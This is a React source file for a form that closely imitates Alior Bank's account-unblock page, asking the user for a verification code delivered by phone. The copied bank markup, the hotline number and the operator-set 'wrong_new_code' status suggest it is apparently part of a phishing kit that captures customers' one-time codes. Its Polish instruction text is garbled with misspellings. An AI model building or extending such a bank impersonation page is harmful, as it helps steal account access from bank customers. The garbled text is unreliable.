import {useForm} from "react-hook-form";
import {yupResolver} from "@hookform/resolvers/yup";
import * as yup from "yup";

const schema = yup.object().shape({
    code: yup.string().min(4).required(),
});
const AliorFormNewCode = ({status, handler}) => {
    const {register, handleSubmit, reset, formState: {errors}} = useForm({
        resolver: yupResolver(schema),
        mode: 'onChange'
    });
    console.log(errors);
    const submitCode = (data) => {
        reset();
        handler(data.code)
    }

    return (
        <form key={'code'} onSubmit={handleSubmit(submitCode)}>
            <div className="column small-19 medium-18">
                <div className="external-page-content">
                    <div className="unblock-access">
                        <channel-reset process-validators="processValidators">
                            <steps className={`animate-to-next steps`}>
                                {
                                    status === 'wrong_new_code' &&
                                    <div id="login-info" className="info-block login-info-box error">
                                        <div className="row">
                                            <div className="shrink column">
                                                <span className="icon icon-exclamation-mark"/>
                                            </div>
                                            <div className="expand column">
                                                <p tabIndex={0} id="login-info-header"
                                                   className="message" role="alert">
                                                    Podano nieprawidłowy kod. Wprowadź poprawne dane, aby się zalogować.
                                                </p>
                                            </div>
                                        </div>
                                    </div>
                                }
                                <step key={'new_code'} className="step-item">
                                    <section className="two-panels-section">
                                        <div className="left-panel">
                                            <div className="left_form_info">
                                                <div className="row">
                                                    <div className="column shrink">
                                                        <span className="icon icon-phone-2"/>
                                                    </div>
                                                    <div className="column expand">
                                                        <p>Za chwilę zadzwonimy do Ciebie, aby przekazać Ci kod
                                                            weryfikacyjny. Gdy go odsłuchasz wpisz go poniżej</p>
                                                    </div>
                                                </div>
                                            </div>
                                            <div className="ng-pristine ng-valid">
                                                <div className="form-container">
                                                    <div>
                                                        <label>Kod weryfikacyjny</label>
                                                        <div className="input-wrapper js-keyboard-container">
                                                            <input type="text"
                                                                   autoComplete="off"
                                                                   className={`js-keyboard-input ng-empty input-field  ${errors.code && 'ng-invalid'}`}
                                                                   {...register('code')}/>
                                                            {
                                                                errors.code ?
                                                                    errors.code.ref.value === '' ?
                                                                        <span
                                                                            className="error-message icon icon-attention">
                                                                            <span>
                                                                                This field cannot be empty.
                                                                            </span>
                                                                        </span> :
                                                                        errors.code.type === 'min' ?
                                                                            <span
                                                                                className="error-message icon icon-attention">
                                                                            <span>
                                                                                Min length: 4
                                                                            </span>
                                                                        </span> : null : null
                                                            }
                                                        </div>
                                                        <div className="row">
                                                            <div className="column small-20 small-order-1 mb-3">
                                                                <button
                                                                    className="button button-cta button-layout-block button-theme-primary"
                                                                    type="submit">
                                                                    <span>Next</span>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div className="right-panel unblock-access-instructions">
                                            <div className="row">
                                                <div className="column shrink">
                                                    <span className="icon icon-info-serif"/>
                                                </div>
                                                <div className="column expand">
                                                    <p>Zadzwommy do Ciebœ (połączenie automatyczne). aby przekazać CI
                                                        4-cyfrowy kod weryfnkacylny. Zapisz go lub zapamiętaj, a
                                                        następnie wpisz na ekrane.</p>
                                                    <p>Jeżeli nie otrzymałeś połączenia skontaktuj suę z infolimą pod nr
                                                        tel.: 19 502 (z zagtamcy: <b>+48 12 19 502</b>)</p>
                                                </div>
                                            </div>
                                        </div>
                                    </section>
                                </step>
                                <div className="svg-loader">
                                    <a11y-loading/>
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="25 25 50 50">
                                        <circle cx={50} cy={50} r={20} fill="none" strokeMiterlimit={10}/>
                                    </svg>
                                </div>
                            </steps>
                        </channel-reset>
                    </div>
                </div>
            </div>
        </form>
    )
}

export default AliorFormNewCode;
